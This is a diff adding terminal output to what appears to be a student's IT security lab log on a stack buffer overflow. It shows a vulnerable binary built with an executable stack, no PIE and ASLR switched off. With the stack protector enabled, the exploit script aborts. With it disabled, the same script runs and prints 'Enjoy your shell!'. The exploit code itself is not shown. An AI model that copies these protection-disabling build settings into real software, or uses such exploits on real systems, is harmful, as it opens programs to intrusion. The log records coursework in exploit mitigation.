@@ -34,3 +34,26 @@ Breakpoint 1, vulnerable_function (string=0xffffce13 "AAAA") at main.c:12
 0xffffcbbc:     0x0804922b  0xffffce13       0xf7fa9000  0xf7ffd020
 0xffffcbcc:     0xf7da4519  0x00000002
 (gdb)
+
+
+
+
+yami@DESKTOP-67OTB06:/mnt/d/UBB/itsecurity/Lab 3/task-1$ make withSSP
+gcc -m32  -O0 -g3 -c -fmessage-length=0 -D_FORTIFY_SOURCE=0 -MMD -MP -MF"app.d" -MT"app.d" -o "app.o" "main.c" -mpreferred-stack-boundary=2 -mno-accumulate-outgoing-args -msse2 -fstack-protector-all
+gcc -m32  -mpreferred-stack-boundary=2 -mno-accumulate-outgoing-args -msse2 -o "app_32" "app.o"  -z execstack  -no-pie  -Wl,-z,relro
+sudo sysctl -w kernel.randomize_va_space=0
+kernel.randomize_va_space = 0
+yami@DESKTOP-67OTB06:/mnt/d/UBB/itsecurity/Lab 3/task-1$ ./app_32 $(python3 reach.py)
+*** stack smashing detected ***: terminated
+Aborted (core dumped)
+yami@DESKTOP-67OTB06:/mnt/d/UBB/itsecurity/Lab 3/task-1$ make clean
+rm -rf "app.o" "app.d" "app_32" "app_64"
+rm -rf shellcode BOFShellcode.bin shellcode.bin
+yami@DESKTOP-67OTB06:/mnt/d/UBB/itsecurity/Lab 3/task-1$ make
+gcc -m32  -O0 -g3 -c -fmessage-length=0 -D_FORTIFY_SOURCE=0 -MMD -MP -MF"app.d" -MT"app.d" -o "app.o" "main.c" -mpreferred-stack-boundary=2 -mno-accumulate-outgoing-args -msse2 -fno-stack-protector
+gcc -m32  -mpreferred-stack-boundary=2 -mno-accumulate-outgoing-args -msse2 -o "app_32" "app.o"  -z execstack  -no-pie  -Wl,-z,relro
+sudo sysctl -w kernel.randomize_va_space=0
+kernel.randomize_va_space = 0
+yami@DESKTOP-67OTB06:/mnt/d/UBB/itsecurity/Lab 3/task-1$ ./app_32 $(python3 reach.py)
+Enjoy your shell!
+yami@DESKTOP-67OTB06:/mnt/d/UBB/itsecurity/Lab 3/task-1$ 
